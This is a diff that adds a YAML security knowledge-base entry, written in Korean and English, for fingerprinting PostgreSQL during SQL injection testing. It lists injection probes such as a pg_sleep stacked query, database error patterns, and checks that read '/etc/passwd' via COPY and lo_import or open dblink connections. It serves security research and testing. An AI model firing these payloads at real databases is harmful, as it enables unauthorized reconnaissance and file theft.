@@ -1,0 +1,192 @@
+# GR-SEC-INS-F0003: PostgreSQL DBMS Fingerprint
+
+identity:
+  id: GR-SEC-INS-F0003
+  name: "PostgreSQL DBMS Fingerprint"
+  normalization:
+    normalized_name: "postgresql dbms fingerprint"
+    normalization_version: "1.0"
+  aliases:
+    - "Postgres Detection"
+    - "PostgreSQL Identification"
+    - "PG Fingerprint"
+
+classification:
+  domain: security
+  type: fingerprint
+  abstraction_level: 1
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-RECON"
+
+definition:
+  what: |
+    대상 데이터베이스가 PostgreSQL인지 확인하기 위한
+    핑거프린트 페이로드와 응답 패턴 집합이다.
+  why: |
+    PostgreSQL은 풍부한 함수와 확장성을 가지며,
+    Stacked Queries, COPY 명령 등 다양한 공격
+    벡터가 존재한다.
+
+fingerprint:
+  # PostgreSQL 고유 문법 테스트
+  syntax_probes:
+    - probe: "' AND 1::int=1--"
+      indicator: ":: type casting works"
+      confidence: 0.9
+
+    - probe: "' AND version()--"
+      indicator: "version() function returns PostgreSQL"
+      confidence: 0.95
+
+    - probe: "'; SELECT pg_sleep(1)--"
+      indicator: "pg_sleep function works"
+      confidence: 0.95
+
+    - probe: "' || 'test"
+      indicator: "|| as string concatenation"
+      confidence: 0.7
+
+    - probe: "' AND current_database()='test"
+      indicator: "current_database() function"
+      confidence: 0.85
+
+  # 에러 메시지 패턴
+  error_patterns:
+    - pattern: "PostgreSQL"
+      confidence: 0.95
+    - pattern: "pg_query"
+      confidence: 0.95
+    - pattern: "pg_exec"
+      confidence: 0.95
+    - pattern: "PSQLException"
+      confidence: 0.9
+    - pattern: "ERROR:  syntax error"
+      confidence: 0.85
+    - pattern: "unterminated quoted string"
+      confidence: 0.8
+    - pattern: "Query failed: ERROR"
+      confidence: 0.85
+    - pattern: "at character"
+      confidence: 0.75
+
+  # PostgreSQL 고유 함수
+  function_probes:
+    - function: "version()"
+      expected_format: "PostgreSQL x.x.x"
+    - function: "current_database()"
+      returns: "current database name"
+    - function: "current_user"
+      returns: "current username"
+    - function: "inet_server_addr()"
+      returns: "server IP address"
+    - function: "pg_backend_pid()"
+      returns: "backend process ID"
+    - function: "pg_postmaster_start_time()"
+      returns: "server start time"
+
+  # 시스템 카탈로그 존재 확인
+  system_tables:
+    - table: "pg_database"
+      query: "SELECT 1 FROM pg_database LIMIT 1"
+    - table: "pg_tables"
+      query: "SELECT 1 FROM pg_tables LIMIT 1"
+    - table: "pg_user"
+      query: "SELECT 1 FROM pg_user LIMIT 1"
+    - table: "information_schema.tables"
+      query: "SELECT 1 FROM information_schema.tables LIMIT 1"
+
+  # 위험한 기능 확인
+  dangerous_features:
+    copy_to:
+      check: "COPY (SELECT 'test') TO '/tmp/test'"
+      risk: "File write"
+    copy_from:
+      check: "COPY table FROM '/etc/passwd'"
+      risk: "File read"
+    dblink:
+      check: "SELECT dblink_connect(...)"
+      risk: "Remote connection, OOB"
+    large_objects:
+      check: "SELECT lo_import('/etc/passwd')"
+      risk: "File read via large objects"
+
+  # 버전별 특성
+  version_features:
+    "9.0+": "Streaming replication, DO blocks"
+    "9.1+": "Unlogged tables, extensions"
+    "9.2+": "JSON type, range types"
+    "9.3+": "Materialized views, LATERAL"
+    "9.4+": "JSONB, pg_stat_statements"
+    "9.5+": "Upsert (ON CONFLICT)"
+    "10+": "Native partitioning, identity columns"
+    "11+": "Stored procedures, JIT"
+    "12+": "Generated columns, CTE optimization"
+    "13+": "Incremental sorting"
+    "14+": "Multirange types"
+    "15+": "MERGE statement"
+
+relations:
+  structural:
+    instance_of:
+      - GR-SEC-CMP-00011  # PostgreSQL Component (TODO)
+  conditional:
+    enables:
+      - GR-SEC-TEC-00003  # Time-based (pg_sleep)
+      - GR-SEC-TEC-00005  # Stacked Queries (native)
+      - GR-SEC-TEC-00006  # OOB (dblink)
+    informs:
+      - GR-SEC-INS-P0005  # Data extraction (PostgreSQL syntax)
+
+properties:
+  security:
+    severity: info
+    purpose: reconnaissance
+    default_ports: [5432]
+    common_drivers:
+      - "pg"
+      - "psycopg2"
+      - "node-postgres"
+      - "JDBC PostgreSQL"
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: manual
+      source_uri: "internal://gr-sqli-fingerprints"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_authoring"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: low
+  ai:
+    embedding_text: |
+      PostgreSQL DBMS Fingerprint는 대상 DB가 PostgreSQL인지
+      확인하는 핑거프린트 집합이다. ::타입캐스팅, pg_sleep(),
+      version(), ||연결연산자 등의 고유 문법을 테스트한다.
+      COPY, dblink 등 파일 접근과 OOB 가능 기능 확인이
+      중요하다. 에러 메시지(pg_query, PSQLException 등)로도
+      식별 가능하다.
+    search_keywords:
+      - "PostgreSQL"
+      - "Postgres"
+      - "pg_sleep"
+      - "pg_query"
+      - "::cast"
+      - "dblink"
